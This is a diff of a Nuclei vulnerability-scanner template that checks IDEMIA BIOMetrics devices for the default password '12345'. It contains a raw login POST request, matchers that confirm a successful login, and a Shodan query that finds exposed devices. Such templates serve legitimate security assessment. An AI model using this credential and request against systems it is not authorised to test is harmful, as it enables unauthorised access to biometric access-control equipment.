@@ -1,40 +1,54 @@
 id: idemia-biometrics-default-login
 
 info:
-  name: IDEMIA BIOMetrics Default Login
+  name: IDEMIA BIOMetrics - Default Login
   author: Techryptic (@Tech)
-  severity: high
-  description: Default Login of password=12345 on IDEMIA BIOMetrics application.
-  reference: https://www.google.com/search?q=idemia+password%3D+"12345"
-  tags: idemia,biometrics,default-login
+  severity: medium
+  description: |
+    IDEMIA BIOMetrics application  default login credentials were discovered.
+  reference:
+    - https://www.google.com/search?q=idemia+password%3D+"12345"
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N
+    cvss-score: 5.8
+    cwe-id: CWE-522
+    cpe: cpe:2.3:h:idemia:sigma_wide:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: title:"IDEMIA"
+    product: sigma_wide
+    vendor: idemia
+  tags: idemia,biometrics,default-login,vuln
 
-requests:
-  - payloads:
-      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
-    attack: sniper
-    threads: 100
-
-    raw:
+http:
+  - raw:
       - |
         POST /cgi-bin/login.cgi HTTP/1.1
-        Host: {{Subdomains}}
-        Accept-Encoding: gzip, deflate
-        
-        password=12345
+        Host: {{Hostname}}
+
+        password={{password}}
+
+    payloads:
+      password:
+        - "12345"
+
     matchers-condition: and
     matchers:
       - type: word
+        part: body
         words:
-          - "session_id="
-          - "resource"
+          - 'document.cookie ="session_id'
+          - 'MA5G_general_configurations.htm'
         condition: and
 
       - type: word
+        part: body
         words:
           - "Invalid Password"
-        part: body
         negative: true
 
       - type: status
         status:
           - 200
+# digest: 4a0a0047304502205c2678d11637a26c1a8004f7e13649194f26a6c4915c731985da87c41c781918022100d9f126f142f2e27a7cf3eac74f54fce3567232fed1b27574690f1df7d44e9215:922c64590222798bb761d5b6d8e72950
